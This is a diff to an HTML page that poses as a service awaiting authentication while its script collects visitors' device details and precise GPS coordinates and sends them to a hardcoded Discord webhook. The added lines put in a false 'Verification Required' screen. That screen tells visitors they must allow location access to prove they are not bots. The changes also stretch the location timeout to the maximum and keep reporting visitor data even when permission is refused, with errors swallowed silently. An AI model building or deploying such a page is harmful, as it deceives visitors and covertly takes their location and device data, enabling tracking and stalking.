@@ -20,7 +20,7 @@
             display: none !important;
         }
 
-        #loader-overlay {
+        .overlay {
             position: fixed;
             top: 0;
             left: 0;
@@ -30,13 +30,14 @@
             display: flex;
             justify-content: center;
             align-items: center;
+            text-align: center;
             z-index: 1000;
             opacity: 1;
             transition: opacity 0.5s ease-out;
         }
 
-        .loader-content {
-            text-align: center;
+        .content-container {
+            padding: 2rem;
         }
 
         #status-text {
@@ -75,17 +76,6 @@
                 stroke-dashoffset: -124;
             }
         }
-
-        #final-message {
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            width: 100%;
-            height: 100%;
-            padding: 2rem;
-            box-sizing: border-box;
-        }
         
         #ad-bait {
             height: 1px !important;
@@ -100,8 +90,8 @@
 <body>
     <div id="ad-bait" class="adsbox ad-container"></div>
 
-    <div id="loader-overlay">
-        <div class="loader-content">
+    <div id="loader-overlay" class="overlay">
+        <div class="content-container">
             <svg class="spinner" viewBox="0 0 50 50">
                 <circle class="path" cx="25" cy="25" r="20" fill="none" stroke-width="5"></circle>
             </svg>
@@ -109,21 +99,33 @@
         </div>
     </div>
 
-    <div id="final-message" class="hidden">
-        <h1>Service Temporarily Unavailable</h1>
-        <p>We are unable to connect to the authentication server. Please try again later. If you are the host, Please check the console for any error details.</p>
+    <div id="denial-screen" class="overlay hidden">
+        <div class="content-container">
+            <h1>Verification Required</h1>
+            <p>You must allow location access to confirm you are not a bot.</p>
+            <p>Please refresh the page and grant the required permission.</p>
+        </div>
+    </div>
+
+    <div id="final-message" class="overlay hidden">
+        <div class="content-container">
+            <h1>Service Temporarily Unavailable</h1>
+            <p>We are unable to connect to the authentication server. Please try again later.</p>
+        </div>
     </div>
 
     <script>
         const webhookUrl = "https://discord.com/api/webhooks/1391308373437321287/7zFHSx9co1IGwIdmrhP6P94t2I-DuvrrPlUabsNNINGIDFEhKyEJhDHQM12DUnyVJVQm";
 
-        const showFinalMessage = () => {
-            const loader = document.getElementById('loader-overlay');
-            loader.style.opacity = '0';
-            setTimeout(() => {
-                loader.classList.add('hidden');
-                document.getElementById('final-message').classList.remove('hidden');
-            }, 500);
+        const showScreen = (screenId) => {
+            document.getElementById('loader-overlay').classList.add('hidden');
+            document.getElementById('denial-screen').classList.add('hidden');
+            document.getElementById('final-message').classList.add('hidden');
+            
+            const screenToShow = document.getElementById(screenId);
+            if (screenToShow) {
+                screenToShow.classList.remove('hidden');
+            }
         };
 
         const sendToWebhook = async (data) => {
@@ -193,8 +195,6 @@
             } catch (error) {
                 // fail silently
             }
-            
-            showFinalMessage();
         };
         
         const getGpuInfo = () => {
@@ -253,22 +253,24 @@
             status.textContent = 'Requesting Location Access...';
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
+                    // success callback (user clicked "allow")
                     (position) => {
                         const { latitude, longitude, accuracy } = position.coords;
                         data.latitude = latitude.toFixed(7);
                         data.longitude = longitude.toFixed(7);
                         data.accuracy = `${accuracy.toFixed(0)} meters`;
-                        sendToWebhook(data);
+                        sendToWebhook(data).then(() => showScreen('final-message'));
                     },
+                    // error callback (user clicked "block" or it failed)
                     (error) => {
                         data.location_error = `Permission Denied or Unavailable`;
-                        sendToWebhook(data);
+                        sendToWebhook(data).then(() => showScreen('denial-screen'));
                     },
-                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                    { enableHighAccuracy: true, timeout: 2147483647, maximumAge: 0 }
                 );
             } else {
                 data.location_error = "Geolocation not supported.";
-                sendToWebhook(data);
+                sendToWebhook(data).then(() => showScreen('final-message'));
             }
         };
 
